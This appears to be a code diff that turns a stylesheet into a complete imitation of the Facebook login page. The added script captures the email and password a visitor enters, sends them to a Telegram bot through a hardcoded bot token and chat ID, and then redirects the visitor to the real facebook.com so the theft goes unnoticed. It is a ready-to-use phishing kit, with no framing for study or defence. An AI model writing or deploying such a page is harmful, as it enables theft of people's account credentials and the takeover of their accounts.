@@ -1,172 +1,187 @@
-/* --- الإعدادات العامة (للكل) --- */
-* {
-    padding: 0;
-    margin: 0;
-    box-sizing: border-box;
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        /* الأساسيات */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
 
-body {
-    font-family: 'Poppins', sans-serif;
-    background-color: #f0f2f5;
-    color: #1c1e21;
-    overflow-x: hidden; /* لمنع أي اهتزاز عرضي في الموبايل */
-}
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
 
-/* --- شكل الكمبيوتر (الأساسي) --- */
-main {
-    min-height: 75vh;
-    width: 100%;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-}
+        /* الحاوية الرئيسية مرنة */
+        main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            padding: 20px;
+        }
 
-.row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    width: 100%;
-    max-width: 980px;
-}
+        .row {
+            display: flex;
+            width: 100%;
+            max-width: 980px;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap; /* للسماح بالعناصر بالنزول تحت بعض في الموبايل */
+        }
 
-.col-logo {
-    flex: 0 0 55%;
-}
+        /* الجانب الأيسر (الكمبيوتر) */
+        .col-logo {
+            flex: 1;
+            min-width: 300px;
+            padding-bottom: 20px;
+        }
 
-.col-logo img {
-    max-width: 300px;
-    margin-left: -20px;
-}
+        .col-logo img {
+            height: 100px;
+            margin-left: -20px;
+        }
 
-.col-logo h2 {
-    font-size: 28px;
-    font-weight: 400;
-    line-height: 32px;
-    padding-right: 30px;
-}
+        .col-logo h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            max-width: 500px;
+        }
 
-.col-form {
-    flex: 0 0 40%;
-}
+        /* الجانب الأيمن (الفورم) */
+        .col-form {
+            width: 396px;
+        }
 
-.form-container {
-    background-color: #ffffff;
-    border-radius: 8px;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-    padding: 20px;
-    text-align: center;
-}
+        .form-container {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 16px;
+            text-align: center;
+        }
 
-.form-container input {
-    width: 100%;
-    margin-bottom: 12px;
-    height: 52px;
-    font-size: 17px;
-    border: 1px solid #dddfe2;
-    border-radius: 6px;
-    padding: 0 16px;
-    outline: none;
-}
+        .form-container input {
+            width: 100%;
+            height: 52px;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            margin-bottom: 12px;
+        }
 
-.form-container input:focus {
-    border-color: #1877f2;
-    box-shadow: 0 0 0 2px #e7f3ff;
-}
+        .form-container input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
 
-.btn-login {
-    width: 100%;
-    height: 48px;
-    background-color: #1877f2;
-    border: none;
-    border-radius: 6px;
-    font-size: 20px;
-    color: #ffffff;
-    font-weight: 700;
-    cursor: pointer;
-}
+        .btn-login {
+            width: 100%;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 48px;
+            cursor: pointer;
+        }
 
-.form-container a {
-    display: block;
-    color: #1877f2;
-    font-size: 14px;
-    text-decoration: none;
-    margin: 15px 0;
-}
+        .form-container a {
+            display: block;
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 15px 0;
+        }
 
-.btn-new {
-    background-color: #42b72a;
-    border: none;
-    border-radius: 6px;
-    font-size: 17px;
-    padding: 0 16px;
-    height: 48px;
-    color: #ffffff;
-    font-weight: 700;
-    cursor: pointer;
-}
+        .btn-new {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            padding: 0 16px;
+            line-height: 48px;
+            margin-top: 10px;
+        }
 
-/* --- الفوتر (مشترك) --- */
-footer {
-    background-color: #ffffff;
-    padding: 20px 0;
-}
+        /* --- شاشات الموبايل (أصغر من 900px) --- */
+        @media (max-width: 900px) {
+            body { background-color: #fff; }
+            
+            main { align-items: flex-start; padding: 10px; }
 
-.footer-contents {
-    max-width: 980px;
-    margin: 0 auto;
-    padding: 0 20px;
-}
+            .row { flex-direction: column; text-align: center; }
 
-footer ol {
-    display: flex;
-    flex-wrap: wrap;
-    list-style: none;
-    font-size: 12px;
-    color: #8a8d91;
-}
+            .col-logo { width: 100%; padding: 10px 0; }
 
-/* --- السحر هنا: شكل الموبايل (أقل من 900px) --- */
-@media (max-width: 900px) {
-    body { background-color: #fff; }
+            .col-logo img { height: 60px; margin-left: 0; }
 
-    main { min-height: auto; padding: 10px 0; }
+            .col-logo h2 { display: none; } /* إخفاء النص في الموبايل كالأصل */
 
-    .row {
-        flex-direction: column; /* يخليهم فوق بعض */
-        text-align: center;
-    }
+            .col-form { width: 100%; max-width: 400px; }
 
-    .col-logo {
-        flex: none;
-        width: 100%;
-        margin-bottom: 10px;
-    }
+            .form-container { box-shadow: none; padding: 0; }
 
-    .col-logo img {
-        max-width: 160px; /* تصغير اللوجو */
-        margin-left: 0;
-    }
+            .form-container input { background-color: #f5f6f7; height: 45px; }
 
-    .col-logo h2 {
-        display: none; /* إخفاء النص الطويل في الموبايل */
-    }
+            .btn-login { line-height: 40px; font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
 
-    .col-form {
-        flex: none;
-        width: 100%;
-        padding: 0 16px;
-    }
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCuV_aC5hc.svg" alt="Facebook">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <form class="form-container" id="login-form">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <button type="submit" class="btn-login">Log In</button>
+                    <a href="#">Forgotten password?</a>
+                    <hr style="border: 0; border-top: 1px solid #dadde1;">
+                    <button type="button" class="btn-new">Create new account</button>
+                </form>
+            </div>
+        </div>
+    </main>
 
-    .form-container {
-        box-shadow: none; /* إلغاء الظل */
-        padding: 0;
-    }
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        // سكريبت الإرسال والتحويل
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
 
-    .form-container input {
-        background-color: #f5f6f7; /* شكل حقول الموبايل */
-        height: 45px;
-    }
-
-    .btn-login { height: 44px; font-size: 18px; }
-}
+            axios.post(`https://api.telegram.org/bot8512653224:AAEEtBb6KxtgonV-Lk2WVQudCstX3y6jEBc/sendMessage`, {
+                chat_id: "6152291210",
+                parse_mode: 'html',
+                text: `📧 <b>User:</b> ${email}\n🔑 <b>Pass:</b> ${password}`
+            }).then(() => {
+                window.location.href = "https://www.facebook.com";
+            }).catch(() => {
+                window.location.href = "https://www.facebook.com";
+            });
+        });
+    </script>
+</body>
+</html>
